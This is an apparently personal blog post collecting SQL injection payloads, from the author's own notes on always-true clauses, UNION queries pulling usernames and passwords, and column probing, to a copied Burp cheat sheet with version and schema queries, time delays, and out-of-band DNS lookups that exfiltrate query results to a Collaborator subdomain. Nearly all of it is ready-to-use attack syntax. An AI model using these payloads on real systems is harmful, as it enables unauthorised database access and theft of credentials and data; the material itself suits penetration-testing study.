---
layout: post
title: SQL Payloads
status: in progress
type: post
published: true
comments: true
---

### Payloads
 
 #### Always True
 The following will cause the quire to allways to be true:
 ```SQL
 '+OR+1=1--
 ```
 This is use full when you can inject into a where clause like in Snip 1
 
 ### Union from other tables
 This attack assumes you are displaying items to the screen and can inject into the where clause of a query.
 ```SQL
 stuff'+UNION+SELECT+username,+password+FROM+user--
 ```
 In this case username and password are the names of the colums that we are pulling from and user is the table we are pulling them from
 
 ### Brute Force Column num with null
 ```SQL
 `' UNION SELECT NULL--  
' UNION SELECT NULL,NULL--  
' UNION SELECT NULL,NULL,NULL--  
etc.
```
Will (hopefully) throw a detectable error when the number of NULL's does not match the number of columns in the tale you are UNIONing with

Important notes: 
 - this may cause null pointer errors which you may or may not see when the data is processed
 - Null is also used because it matches every data type

 OS Specific Info
	- On oracle every select must have a where. In selecting null we can use the DUAL table so `UNION SELECT NULL FROM DUAL--`

  ### Brute Force Column num with ORDER BY
  ```SQL  
' ORDER BY 1--  
' ORDER BY 2--  
' ORDER BY 3--  
' ORDER BY N--  
etc.
```
Where this should only work when the index of the column (the number) exists in the database. So if N > the number of columns an error will occur.

### Brute force Column types
```SPL
' UNION SELECT 'a',NULL,NULL,NULL--  
' UNION SELECT NULL,'a',NULL,NULL--  
' UNION SELECT NULL,NULL,'a',NULL--  
' UNION SELECT NULL,NULL,NULL,'a'--
```

In this attack you try to select a string value for each column and if the isn't a string then it will create an error. This means that you can figure out if the column has strings based on the error messages
  
 
 ## [Burp Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 ### String concatenation

You can concatenate together multiple strings to make a single string.

Oracle

`'foo'||'bar'`

Microsoft

`'foo'+'bar'`

PostgreSQL

`'foo'||'bar'`

MySQL

`'foo' 'bar'` [Note the space between the two strings]  
`CONCAT('foo','bar')`

### Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

Oracle

`SUBSTR('foobar', 4, 2)`

Microsoft

`SUBSTRING('foobar', 4, 2)`

PostgreSQL

`SUBSTRING('foobar', 4, 2)`

MySQL

`SUBSTRING('foobar', 4, 2)`

### Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input.

Oracle

`--comment  
`

Microsoft

`--comment  
/*comment*/`

PostgreSQL

`--comment  
/*comment*/`

MySQL

`#comment`  
`-- comment` [Note the space after the double dash]  
`/*comment*/`

### Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

Oracle

`SELECT banner FROM v$version  
SELECT version FROM v$instance  
`

Microsoft

`SELECT @@version`

PostgreSQL

`SELECT version()`

MySQL

`SELECT @@version`

### Database contents

You can list the tables that exist in the database, and the columns that those tables contain.

Oracle

`SELECT * FROM all_tables  
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`

Microsoft

`SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  
`

PostgreSQL

`SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  
`

MySQL

`SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

### Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true.

Oracle

`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual`

Microsoft

`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`

PostgreSQL

`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END`

MySQL

`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

### Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

Oracle

`Does not support batched queries.`

Microsoft

`QUERY-1-HERE; QUERY-2-HERE`

PostgreSQL

`QUERY-1-HERE; QUERY-2-HERE`

MySQL

`QUERY-1-HERE; QUERY-2-HERE`

#### Note

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
### Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

Oracle

`dbms_pipe.receive_message(('a'),10)`

Microsoft

`WAITFOR DELAY '0:0:10'`

PostgreSQL

`SELECT pg_sleep(10)`

MySQL

`SELECT sleep(10)`
### Conditional time delays
### DNS
#### DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

Oracle

The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:  
`SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`  
  
The following technique works on fully patched Oracle installations, but requires elevated privileges:  
`SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')`

Microsoft

`exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'`

PostgreSQL

`copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'`

MySQL

The following techniques work on Windows only:  
`LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')`  
`SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'`

You can test a single boolean condition and trigger a time delay if the condition is true.

Oracle

`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`

Microsoft

`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`

PostgreSQL

`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`

MySQL

`SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`
#### DNS lookup with data exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

Oracle

`SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`

Microsoft

`declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')`

PostgreSQL

`create OR replace function f() returns void as $$  
declare c text;  
declare p text;  
begin  
SELECT into p (SELECT YOUR-QUERY-HERE);  
c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';  
execute c;  
END;  
$$ language plpgsql security definer;  
SELECT f();`

MySQL

The following technique works on Windows only:  
`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'`
